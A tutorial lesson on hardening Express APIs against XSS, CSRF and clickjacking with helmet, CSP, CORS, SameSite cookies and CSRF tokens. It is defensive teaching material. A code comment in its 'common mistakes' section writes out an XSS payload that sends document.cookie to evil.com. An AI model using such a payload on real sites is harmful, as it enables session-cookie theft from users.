# 78 — XSS, CSRF, Clickjacking

## What is this?

XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), and Clickjacking are three of the most common attacks against web applications, and each targets a different weak spot. XSS tricks your app into running an attacker's JavaScript inside a victim's browser. CSRF tricks a victim's browser into sending a request the victim never intended, using credentials it already has (like cookies). Clickjacking tricks a victim into clicking something on your site that is invisibly layered under something else. Think of a bank: XSS is someone slipping a forged note into your own letterhead, CSRF is someone forging your signature using a pen you left on the counter, and clickjacking is someone putting a fake button over the real "Transfer Money" button so you click theirs by mistake.

## Why does it matter for backend development?

As a backend developer you cannot fully "fix" these in the browser — you fix them by configuring the server to send the right HTTP headers and cookie attributes so the browser protects the user for you. `helmet.js` sets a whole bundle of security headers (including `X-Frame-Options` and `Content-Security-Policy`) with one line. Correct `CORS` configuration stops random websites from calling your API with a victim's credentials. `SameSite` cookie attributes stop cookies from being sent on cross-site requests, which kills most CSRF attacks at the source. These are not optional extras — they are expected baseline security on any production Express/Node API, and interviewers and security reviewers check for them specifically.

---

## Syntax / API

```js
// Install: npm install helmet cors cookie-parser csurf
const express = require('express');
const helmet  = require('helmet');     // sets many security headers at once
const cors    = require('cors');       // controls which origins can call this API

const app = express();

// ── Helmet — sets ~15 security headers with sensible defaults ─────────────
app.use(helmet());
// Includes X-Frame-Options: SAMEORIGIN (anti-clickjacking) and more, by default

// ── Explicit clickjacking protection (helmet does this too, shown for clarity)
app.use(helmet.frameguard({ action: 'deny' }));
// 'deny'      → page can NEVER be shown in an <iframe>, anywhere
// 'sameorigin'→ page can only be framed by pages on the SAME origin

// ── Content-Security-Policy — the modern, stronger anti-XSS + anti-clickjacking tool
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],           // only load resources from our own origin
    scriptSrc: ["'self'"],            // block inline <script> and third-party scripts
    frameAncestors: ["'none'"],       // modern replacement for X-Frame-Options
  },
}));

// ── CORS — whitelist exactly which frontend origins may call this API ──────
app.use(cors({
  origin: 'https://app.myproduct.com',  // ONLY this origin may call the API
  credentials: true,                     // allow cookies to be sent cross-origin
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
}));

// ── SameSite cookies — the primary defense against CSRF ─────────────────────
app.use((req, res, next) => {
  res.cookie('sessionId', req.sessionId, {
    httpOnly: true,     // JavaScript cannot read this cookie (defends against XSS theft)
    secure: true,        // cookie only sent over HTTPS
    sameSite: 'strict',  // cookie NEVER sent on cross-site requests (defends against CSRF)
  });
  next();
});

module.exports = app;
```

---

## How it works — line by line

`helmet()` is a middleware factory — calling it returns an Express middleware function that, on every response, adds a batch of security-related HTTP headers before your route handlers even run. One header it sets is `X-Frame-Options`, which tells the browser "do not let any other website put my page inside an `<iframe>`" — that single header is what stops clickjacking, because clickjacking depends entirely on framing your page underneath a fake button.

`Content-Security-Policy` (CSP) is a much stronger, more granular rule set sent as one header. `defaultSrc: ["'self'"]` says "only trust resources — scripts, images, styles — that come from my own domain." `scriptSrc: ["'self'"]` specifically blocks any `<script>` tag an attacker manages to inject via XSS, because the browser will refuse to execute a script that didn't come from your own origin. `frameAncestors: ["'none'"]` is the modern equivalent of `X-Frame-Options: DENY` — it stops framing at the CSP level, which browsers now prefer.

`cors()` controls the `Access-Control-Allow-Origin` response header, which is the browser's gatekeeper for cross-origin requests. When you set `origin: 'https://app.myproduct.com'`, the browser only allows JavaScript running on that exact domain to read the response of a request to your API. `credentials: true` additionally permits cookies to travel with cross-origin requests, but only paired with an explicit origin (never with a wildcard `*`).

The `res.cookie()` call sets three attributes that matter for security. `httpOnly: true` means client-side JavaScript (`document.cookie`) can never read this cookie — so even if an XSS attack succeeds in injecting a script, that script cannot steal the session cookie. `secure: true` means the cookie is only ever sent over an HTTPS connection, never plain HTTP. `sameSite: 'strict'` tells the browser to withhold this cookie entirely when the request originates from a different site — which is exactly the scenario a CSRF attack relies on (a malicious page on `evil.com` triggering a request to `yourapi.com` using the victim's existing login cookie).

---

## Example 1 — basic

```js
// File: src/security-headers-demo.js
// Minimal Express server showing helmet + CORS + cookie hardening in isolation.

const express = require('express');
const helmet  = require('helmet');
const cors    = require('cors');

const app = express();

// Apply helmet FIRST — before routes — so every response gets the headers
app.use(helmet());

// Only allow our known frontend origin to call this API with credentials
app.use(cors({
  origin: 'http://localhost:5173',  // Vite/React dev server, as an example
  credentials: true,
}));

// A route that sets a hardened cookie on login
app.post('/login', (req, res) => {
  const authToken = 'signed.jwt.token.here'; // pretend this is a real signed JWT

  res.cookie('authToken', authToken, {
    httpOnly: true,     // JS on the page can't read it — blocks XSS token theft
    secure: true,        // HTTPS only
    sameSite: 'lax',     // sent on same-site nav, blocked on most cross-site requests
    maxAge: 1000 * 60 * 60, // 1 hour, in milliseconds
  });

  res.json({ message: 'Logged in' }); // response body never contains the raw token
});

app.listen(3000, () => {
  console.log('Server running on port 3000 with security headers enabled');
});
```

---

## Example 2 — real world backend use case

```js
// File: src/server.js
// A realistic Express API setup: helmet with a custom CSP, environment-based
// CORS whitelist, and CSRF protection on state-changing routes.

const express    = require('express');
const helmet     = require('helmet');
const cors       = require('cors');
const cookieParser = require('cookie-parser');
const csrf       = require('csurf');

const app = express();

app.use(express.json());
app.use(cookieParser());

// ── Helmet with a project-specific Content-Security-Policy ─────────────────
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", 'https://cdn.trusted-analytics.com'], // whitelist one CDN
      imgSrc: ["'self'", 'data:', 'https://cdn.myproduct-assets.com'],
      frameAncestors: ["'none'"], // nobody may iframe this app — anti-clickjacking
    },
  },
}));

// ── CORS whitelist driven by environment, not hardcoded per-env ────────────
const allowedOrigins = (process.env.ALLOWED_ORIGINS || '').split(','); // e.g. "https://app.com,https://admin.app.com"

app.use(cors({
  origin(requestOrigin, callback) {
    // No origin (e.g. server-to-server, curl) — allow; browser requests always send one
    if (!requestOrigin || allowedOrigins.includes(requestOrigin)) {
      callback(null, true); // origin is trusted
    } else {
      callback(new Error(`CORS blocked for origin: ${requestOrigin}`)); // reject
    }
  },
  credentials: true, // needed so the browser will attach the sessionId cookie
}));

// ── CSRF protection — issues and validates a per-session token ─────────────
const csrfProtection = csrf({
  cookie: {
    httpOnly: true,   // token cookie itself isn't readable by JS
    sameSite: 'strict',
    secure: process.env.NODE_ENV === 'production', // allow http in local dev only
  },
});

// Give the frontend a CSRF token to embed in forms / send as a header
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() }); // frontend sends this back on writes
});

// Any state-changing route requires the matching CSRF token
app.post('/api/users/:userId/email', csrfProtection, (req, res) => {
  const { userId } = req.params;
  const { newEmail } = req.body;

  // csrfProtection already verified the token before this handler runs —
  // if it failed, Express would have thrown a 403 before we get here
  updateUserEmail(userId, newEmail); // pretend DB update
  res.json({ message: `Email updated for user ${userId}` });
});

function updateUserEmail(userId, newEmail) {
  console.log(`(mock) user ${userId} email set to ${newEmail}`);
}

app.listen(process.env.PORT || 3000, () => {
  console.log('API running with helmet, CORS whitelist, and CSRF protection');
});
```

---

## Common mistakes

### Mistake 1 — Using a CORS wildcard with credentials

```js
// ❌ WRONG — origin: '*' with credentials: true is rejected by browsers, and
// even if it weren't, it would let ANY website read responses using a victim's cookies
app.use(cors({
  origin: '*',
  credentials: true,
}));

// ✅ CORRECT — always name exact trusted origins when credentials are involved
app.use(cors({
  origin: ['https://app.myproduct.com', 'https://admin.myproduct.com'],
  credentials: true,
}));
```

### Mistake 2 — Setting cookies without SameSite or httpOnly

```js
// ❌ WRONG — no httpOnly means client JS (and any XSS payload) can read the cookie;
// no sameSite means the browser will send it on cross-site requests too (CSRF risk)
res.cookie('sessionId', sessionId);

// ✅ CORRECT — lock the cookie down on every axis that matters
res.cookie('sessionId', sessionId, {
  httpOnly: true,    // JS cannot read it, even after a successful XSS injection
  secure: true,       // never sent over plain HTTP
  sameSite: 'strict', // never sent on requests originating from another site
});
```

### Mistake 3 — Trusting user input in HTML without escaping (enables XSS)

```js
// ❌ WRONG — rendering raw user input directly into an HTML response lets an
// attacker submit a "name" like <script>fetch('https://evil.com?c='+document.cookie)</script>
app.get('/profile', (req, res) => {
  res.send(`<h1>Welcome, ${req.query.name}</h1>`); // XSS if name contains a <script> tag
});

// ✅ CORRECT — escape user input before it reaches the HTML, and let helmet's CSP
// block any script that does slip through (defense in depth)
const escapeHtml = require('escape-html');

app.get('/profile', (req, res) => {
  const safeName = escapeHtml(req.query.name); // turns < into &lt; etc.
  res.send(`<h1>Welcome, ${safeName}</h1>`);    // browser renders it as text, not code
});
```

---

## Practice exercises

### Exercise 1 — easy

Build a tiny Express app with a single `GET /` route that returns `"hello"` as plain text. Add `helmet()` as middleware and start the server. Use `curl -I http://localhost:3000` (or your browser's network tab) to inspect the response headers and confirm that `X-Frame-Options`, `X-Content-Type-Options`, and `Content-Security-Policy` are all present. Print a short comment in your code next to each header explaining in one line what attack it defends against.

```js
// Write your code here
```

---

### Exercise 2 — medium

Build an Express API with two routes: `POST /login` (sets a cookie named `sessionId`) and `GET /account` (reads `req.cookies.sessionId` and returns account data, or a 401 if missing). Configure the `sessionId` cookie with `httpOnly`, `secure`, and `sameSite: 'strict'`. Then configure CORS so that only requests from `http://localhost:5173` are allowed, and `credentials: true` is enabled so the cookie can travel cross-origin during local frontend development. Test it by writing a small HTML file served from a *different* port that tries to `fetch('/account', { credentials: 'include' })` — confirm it works from the allowed origin and fails from a disallowed one.

```js
// Write your code here
```

---

### Exercise 3 — hard

Build a `POST /api/transfer` endpoint that simulates moving money between two accounts (`fromAccountId`, `toAccountId`, `amount` in the body). Protect it fully:
1. Add `helmet()` with a custom CSP that blocks all inline scripts and disallows framing entirely (`frameAncestors: ["'none'"]`).
2. Add CORS restricted to a single trusted origin, with `credentials: true`.
3. Add CSRF protection using the `csurf` package: expose a `GET /api/csrf-token` route that issues a token, and require that token on the `/api/transfer` route.
4. Write a short test script (using `node-fetch` or `curl`) that proves: (a) calling `/api/transfer` without a CSRF token is rejected with 403, and (b) calling it after fetching a valid token from `/api/csrf-token` succeeds.
5. Add a comment explaining, in your own words, why SameSite cookies alone are usually enough for most apps but a dedicated CSRF token is stronger defense-in-depth for money-moving endpoints specifically.

```js
// Write your code here
```

---

## Quick reference cheat sheet

```
THE THREE ATTACKS
  XSS          → attacker's JS runs in the victim's browser (via injected input)
  CSRF         → victim's browser sends a request attacker wants, using victim's own cookies
  Clickjacking → victim clicks a real button hidden under an attacker's fake overlay

HELMET.JS — one call, many headers
  app.use(helmet())
    X-Frame-Options: SAMEORIGIN        → anti-clickjacking
    X-Content-Type-Options: nosniff    → stops MIME-sniffing attacks
    Content-Security-Policy            → anti-XSS, anti-clickjacking (frameAncestors)
    Strict-Transport-Security          → forces HTTPS on future visits

CONTENT-SECURITY-POLICY (CSP) — modern, granular
  defaultSrc: ["'self'"]        → only load resources from our own origin
  scriptSrc: ["'self'"]         → blocks inline/injected <script> tags
  frameAncestors: ["'none'"]    → modern replacement for X-Frame-Options: DENY

CORS — who may call this API from a browser
  origin: 'https://exact-trusted-domain.com'   → whitelist ONE known origin
  origin: (origin, cb) => { ... }              → dynamic whitelist function
  credentials: true                            → allow cookies cross-origin
  NEVER: origin: '*' together with credentials: true

COOKIE FLAGS — the real CSRF/XSS defense
  httpOnly: true      → JS cannot read the cookie (defends stolen-cookie XSS)
  secure: true         → cookie only sent over HTTPS
  sameSite: 'strict'   → never sent on cross-site requests (kills most CSRF)
  sameSite: 'lax'      → sent on top-level navigation, blocked on cross-site POSTs
  sameSite: 'none'     → sent everywhere; REQUIRES secure: true; use only if truly needed

CSRF TOKENS — extra layer for sensitive state-changing routes
  GET  /csrf-token   → issues a token tied to the session
  POST /sensitive     → request must include the matching token (header or body)
  Use for: money transfers, password/email changes, admin actions

XSS PREVENTION CHECKLIST
  - Escape/encode all user input before inserting into HTML
  - Use a templating engine that auto-escapes (EJS/Pug do this by default)
  - Set httpOnly on session/auth cookies so stolen scripts can't read them
  - Set a strict Content-Security-Policy as a second line of defense
```

---

## Connected topics

- **74 — Security fundamentals in Node** — the broader OWASP mindset (least privilege, never trust input) that XSS/CSRF/clickjacking defenses are built on top of
- **58 — Authentication patterns — Sessions** — `express-session`, cookie stores, and CSRF protection specifically in the context of session-based auth
- **55 — Express middleware in depth** — `helmet()` and `cors()` are both just Express middleware; understanding middleware order explains why they must run before your routes
